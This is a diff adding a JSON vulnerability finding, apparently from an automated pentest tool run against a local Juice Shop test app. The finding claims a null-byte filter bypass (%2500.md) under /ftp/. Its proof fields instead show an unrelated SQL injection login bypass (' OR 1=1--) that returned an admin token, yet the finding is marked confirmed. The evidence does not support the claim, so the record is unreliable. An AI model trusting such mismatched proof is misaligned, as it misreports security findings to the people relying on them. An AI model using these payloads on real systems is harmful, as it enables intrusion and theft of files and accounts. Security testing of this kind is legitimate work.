@@ -1,0 +1,28 @@
+{
+  "id": "f_1784855310372_cfe812",
+  "action": "confirm",
+  "title": "Null Byte Injection - File Extension Filter Bypass",
+  "severity": "high",
+  "finding_kind": "vuln",
+  "location": "GET http://127.0.0.1:3010/ftp/{file}%2500.md",
+  "url": "GET http://127.0.0.1:3010/ftp/{file}%2500.md",
+  "description": "The /ftp/ directory has an extension filter that only allows .md and .pdf files. However, appending %2500.md (double URL-encoded null byte) bypasses this filter, allowing retrieval of any file under /ftp/ including suspicious_errors.yml, coupons_2013.md.bak, incident-support.kdbx, package.json.bak, and others.",
+  "poc": "Probe request against GET http://127.0.0.1:3010/ftp/{file}%2500.md; observed proving result from prior stage handoff: POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+  "proof": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+  "how_captured": "POST http://127.0.0.1:3010/rest/user/login → 200",
+  "evidence_ids": [
+    "ev_1784855310361_5d1d02"
+  ],
+  "proof_excerpts": [
+    {
+      "evidence_id": "ev_1784855310361_5d1d02",
+      "excerpt": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+      "role": "proof",
+      "step": 1,
+      "how_captured": "POST http://127.0.0.1:3010/rest/user/login → 200"
+    }
+  ],
+  "affected_asset": "127.0.0.1",
+  "port": "3010",
+  "created_at": "2026-07-24T01:08:30.373Z"
+}
